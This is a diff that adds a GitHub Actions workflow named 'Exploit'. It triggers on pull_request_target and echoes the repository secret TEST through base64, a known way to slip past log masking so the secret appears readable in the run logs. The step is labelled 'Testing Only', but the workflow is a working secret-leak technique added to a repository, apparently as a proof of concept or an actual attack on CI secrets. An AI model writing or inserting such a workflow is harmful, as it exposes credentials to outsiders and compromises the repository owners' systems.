@@ -1,1 +1,15 @@
-و
+name: Exploit
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Display Secret (Testing Only)
+        run: |
+          echo "${{ secrets.TEST }}" | base64
